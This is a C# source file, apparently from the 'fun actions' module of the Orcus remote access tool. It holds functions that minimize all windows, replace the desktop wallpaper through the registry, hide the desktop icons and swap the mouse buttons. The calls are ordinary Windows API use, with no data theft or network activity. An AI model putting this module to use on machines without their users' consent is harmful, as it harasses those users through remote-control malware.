using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using Microsoft.Win32;
using Orcus.Native;
using Orcus.Utilities;

namespace Orcus.Commands.FunActions;

public static class Computer
{
	public enum Style
	{
		Tiled,
		Centered,
		Stretched
	}

	public class DesktopWallpaperRestoreInfo
	{
		public string WallpaperStyle { get; set; }

		public string TileWallpaper { get; set; }

		public string WallpaperPath { get; set; }

		public void Restore()
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true))
			{
				if (registryKey == null)
				{
					return;
				}
				registryKey.SetValue("WallpaperStyle", WallpaperStyle);
				registryKey.SetValue("TileWallpaper", TileWallpaper);
				registryKey.SetValue("Wallpaper", WallpaperPath);
			}
			NativeMethods.SystemParametersInfo(20, 0, WallpaperPath, 3);
		}
	}

	private const int WM_COMMAND = 273;

	private const int MIN_ALL = 419;

	private const int MIN_ALL_UNDO = 416;

	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_UPDATEINIFILE = 1;

	private const int SPIF_SENDWININICHANGE = 2;

	public static void MinimizeAllScreens()
	{
		NativeMethods.SendMessage(NativeMethods.FindWindow("Shell_TrayWnd", null), 273u, (IntPtr)419, IntPtr.Zero);
	}

	public static void RestoreAllScreens()
	{
		NativeMethods.SendMessage(NativeMethods.FindWindow("Shell_TrayWnd", null), 273u, (IntPtr)416, IntPtr.Zero);
	}

	public static void SetDesktopWallpaper(Image newWallpaper, Style style, out DesktopWallpaperRestoreInfo desktopWallpaperRestoreInfo)
	{
		desktopWallpaperRestoreInfo = null;
		string text = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
		newWallpaper.Save(text, ImageFormat.get_Bmp());
		using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
		if (registryKey != null)
		{
			desktopWallpaperRestoreInfo = new DesktopWallpaperRestoreInfo
			{
				TileWallpaper = (string)registryKey.GetValue("TileWallpaper"),
				WallpaperStyle = (string)registryKey.GetValue("WallpaperStyle"),
				WallpaperPath = (string)registryKey.GetValue("Wallpaper")
			};
			switch (style)
			{
			default:
				throw new ArgumentOutOfRangeException("style");
			case Style.Tiled:
				registryKey.SetValue("WallpaperStyle", 1.ToString());
				registryKey.SetValue("TileWallpaper", 1.ToString());
				break;
			case Style.Centered:
				registryKey.SetValue("WallpaperStyle", 1.ToString());
				registryKey.SetValue("TileWallpaper", 0.ToString());
				break;
			case Style.Stretched:
				registryKey.SetValue("WallpaperStyle", 2.ToString());
				registryKey.SetValue("TileWallpaper", 0.ToString());
				break;
			}
			NativeMethods.SystemParametersInfo(20, 0, text, 3);
		}
	}

	public static void ToggleDesktopIcons()
	{
		NativeMethods.SendMessage(wParam: new IntPtr(29698), hWnd: WindowHelper.GetDesktopWindow(DesktopWindow.ProgMan), Msg: 273u, lParam: IntPtr.Zero);
	}

	public static void SwapMouseButtons()
	{
		NativeMethods.SwapMouseButton(1);
	}

	public static void RestoreMouseButtons()
	{
		NativeMethods.SwapMouseButton(0);
	}
}
